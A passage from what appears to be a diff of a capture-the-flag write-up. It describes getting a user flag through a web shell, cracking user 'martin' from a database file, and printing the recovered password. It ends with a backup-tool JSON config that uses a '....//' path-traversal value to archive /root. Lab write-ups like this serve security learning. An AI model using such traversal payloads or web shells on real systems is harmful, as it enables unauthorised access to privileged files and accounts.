@@ -17,3 +17,20 @@ out, _ = proc.communicate()
 if out:
     print(out.decode())
 ```
+With this payload, i wreated a web shell and executed it i got the user flag
+
+found database file, and cracked the user martin
+
+nafeelswordsmaster
+
+
+```json
+{
+  "destination": "/tmp/backups",
+  "multiprocessing": true,
+  "verbose_log": false,
+  "directories_to_archive": [
+    "/home/....//....//root"
+  ]
+}
+```
